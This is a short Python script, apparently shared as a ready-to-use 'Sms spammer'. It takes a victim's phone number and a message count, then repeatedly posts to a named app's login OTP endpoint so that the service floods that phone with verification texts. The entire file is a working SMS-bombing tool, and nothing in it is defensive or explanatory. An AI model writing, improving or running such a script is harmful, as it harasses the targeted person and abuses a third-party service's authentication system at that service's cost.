import requests

def send_otp_requests(phone, num_requests):
    url = "https://fatura-app.com/auth/otp/send"
    payload = {
        "type": "login",
        "phone": phone,
        "otp": None
    }
    
    for i in range(1, num_requests + 1):
        response = requests.post(url, json=payload)
        if response.status_code == 200:
            print(f"Done Sent {i} messages")
        else:
            pass

if __name__ == "__main__":
    #dont decode it , please if u decode it tell me bro @Mrfa0gh
    print('Sms spammer By Ghalwash @Mrfa0gh')
    print('')
    phone = input("Enter phone number: ")
    num_requests = int(input("Enter number Messages: "))
    send_otp_requests(phone, num_requests)
